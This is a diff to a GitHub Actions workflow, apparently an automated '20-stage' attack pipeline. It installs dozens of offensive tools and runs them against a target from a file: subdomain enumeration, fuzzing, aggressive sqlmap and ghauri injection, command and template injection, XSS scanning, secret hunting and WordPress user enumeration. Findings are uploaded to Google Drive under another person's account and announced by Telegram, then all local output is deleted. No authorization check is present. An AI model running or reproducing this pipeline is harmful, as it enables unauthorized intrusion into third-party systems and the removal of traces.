@@ -10,7 +10,7 @@ jobs:
       - name: Checkout Repo
         uses: actions/checkout@v4
 
-      - name: "Global Arsenal & Wordlist Load"
+      - name: "Full Global Arsenal & Wordlist Load"
         run: |
           sudo apt-get update
           sudo apt-get install -y python3-pip golang-go default-jre zip curl wget git libpcap-dev ruby-full chromium chromium-driver xvfb libcurl4-openssl-dev libxml2-dev libxslt1-dev
@@ -23,7 +23,7 @@ jobs:
           wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt -O wordlists/dir-med.txt
           wget https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt -O wordlists/subs.txt
 
-          # INSTALLING ALL 60+ TOOLS (Full List)
+          # INSTALLING ALL 60+ TOOLS (Fixed Version List)
           go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest || true
           go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest || true
           go install -v github.com/projectdiscovery/katana/cmd/katana@latest || true
@@ -35,7 +35,7 @@ jobs:
           go install -v github.com/tomnomnom/waybackurls@latest || true
           go install -v github.com/tomnomnom/assetfinder@latest || true
           
-          pip3 install sqlmap arjun wfuzz gitleaks trufflehog s3scanner prowler commix ghauri nosqlmap waymore jsluice jwt_tool kiterunner wpscan eyewitness secretfinder cloudsplaining tplmap xsstrike gitdorker cloudsplaining || true
+          pip3 install sqlmap arjun wfuzz gitleaks trufflehog s3scanner prowler commix ghauri nosqlmap waymore jsluice jwt_tool kiterunner wpscan eyewitness secretfinder cloudsplaining tplmap xsstrike gitdorker || true
           
           git clone https://github.com/m4ll0k/SecretFinder.git $HOME/tools/SecretFinder && pip3 install -r $HOME/tools/SecretFinder/requirements.txt || true
           git clone https://github.com/devanshbatham/paramspider $HOME/tools/paramspider && pip3 install $HOME/tools/paramspider/. || true
@@ -52,7 +52,7 @@ jobs:
           TARGET=$(cat targets.txt | head -n 1)
           send_msg() { curl -s -X POST "https://api.telegram.org/bot$TELEGRAM_TOKEN/sendMessage" -d chat_id="$TELEGRAM_CHAT_ID" -d parse_mode="Markdown" -d text="$1"; }
           
-          # Persistent Uploader (Acts as Harsh, uses 15GB space)
+          # Persistent OAuth2 Uploader (Acts as Harsh, uses 15GB space)
           cat << 'EOF' > oauth_upload.py
           import os, sys
           from google.oauth2.credentials import Credentials
@@ -74,7 +74,7 @@ jobs:
 
           send_msg "☢️ *ARES 20-STAGE MONSTER:* Engaged on \`$TARGET\`"
 
-          # 1-3: DNS & RECON
+          # 1-3: DNS & RECON (Persistent)
           subfinder -d $TARGET -all -recursive -o output/recon/subs.txt
           assetfinder --subs-only $TARGET >> output/recon/subs.txt
           [ ! -s output/recon/subs.txt ] && echo $TARGET > output/recon/subs.txt
@@ -83,45 +83,43 @@ jobs:
           # 4-5: PROBING & VISUAL
           httpx -l output/recon/subs.txt -sc -td -title -ip -o output/probing/live.txt
           [ ! -s output/probing/live.txt ] && echo "http://$TARGET" > output/probing/live.txt
+          
+          # Fixed Gowitness (Syntax fix for "flag not defined")
           xvfb-run gowitness scan file -f output/probing/live.txt --screenshot-path output/screenshots/ || true
           zip -r "screenshots.zip" output/screenshots/ && python3 oauth_upload.py "screenshots.zip" "$FOLDER_ID"
 
-          # 6-8: URL MINING (Katana Depth 10 + Gau + Waymore)
+          # 6-8: URL MINING (Katana Depth 10)
           katana -l output/probing/live.txt -d 10 -jc -o output/crawling/urls.txt
           gau $TARGET >> output/crawling/urls.txt || true
           waymore -i $TARGET -mode U -oU output/crawling/waymore.txt || true
           python3 oauth_upload.py "output/crawling/urls.txt" "$FOLDER_ID"
 
-          # 9-10: PARAM & FUZZING
-          arjun -i output/crawling/urls.txt -oT output/fuzzing/params.txt || true
+          # 9-11: PARAM & FUZZING (Aggressive Mode)
+          arjun -u "http://$TARGET" -oT output/fuzzing/params.txt || true
           paramspider -d $TARGET --level high -o output/fuzzing/paramspider.txt || true
           ffuf -w wordlists/dir-med.txt -u http://$TARGET/FUZZ -t 100 -o output/fuzzing/ffuf.json || true
           python3 oauth_upload.py "output/fuzzing/ffuf.json" "$FOLDER_ID"
 
-          # 11-13: VULNERABILITY (Nuclei + SQLMap Level 5 + Ghauri)
+          # 12-14: VULNERABILITY (Nuclei + SQLMap Level 5)
           nuclei -l output/probing/live.txt -severity critical,high,medium -o output/vulns/nuclei.txt
           sqlmap -m output/crawling/urls.txt --batch --level 5 --risk 3 --threads 10 > output/vulns/sqlmap.txt || true
           ghauri -u "http://$TARGET" --batch --dbs > output/vulns/ghauri.txt || true
           python3 oauth_upload.py "output/vulns/nuclei.txt" "$FOLDER_ID"
 
-          # 14-16: WEB ATTACKS (XSStrike, Dalfox, Commix, TPLMap)
+          # 15-17: WEB ATTACKS (XSStrike, Dalfox, Commix)
           dalfox file output/crawling/urls.txt -o output/vulns/xss.txt || true
           commix --url="http://$TARGET" --batch > output/vulns/commix.txt || true
           tplmap -u "http://$TARGET" --batch > output/vulns/tplmap.txt || true
           python3 oauth_upload.py "output/vulns/xss.txt" "$FOLDER_ID"
 
-          # 17-18: SECRETS (TruffleHog, SecretFinder, JS Analysis)
+          # 18-20: SECRETS & SPECIALIZED (TruffleHog + JS)
           trufflehog github --repo="https://github.com/$TARGET" > output/secrets/truffle.txt || true
           cat output/crawling/urls.txt | grep ".js" | xargs -I % python3 $HOME/tools/SecretFinder/SecretFinder.py -i % -o cli > output/secrets/js.txt || true
+          s3scanner --bucket $TARGET > output/specialized/s3.txt || true
+          wpscan --url http://$TARGET --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
           python3 oauth_upload.py "output/secrets/js.txt" "$FOLDER_ID"
 
-          # 19-20: CLOUD & AUTH (S3Scanner, JWT_Tool, Kiterunner)
-          s3scanner --bucket $TARGET > output/specialized/s3.txt || true
-          kiterunner scan http://$TARGET -o output/specialized/kiterunner.txt || true
-          wpscan --url http://$TARGET --enumerate p,t,u --format cli > output/specialized/wpscan.txt || true
-          python3 oauth_upload.py "output/specialized/wpscan.txt" "$FOLDER_ID"
-
-          # TOTAL PURGE
+          # TOTAL PURGE (Only after all 20 stages are finished)
           rm -rf output/ wordlists/
           send_msg "✅ *ARES:* Absolute Mission Complete. Check Drive."
           
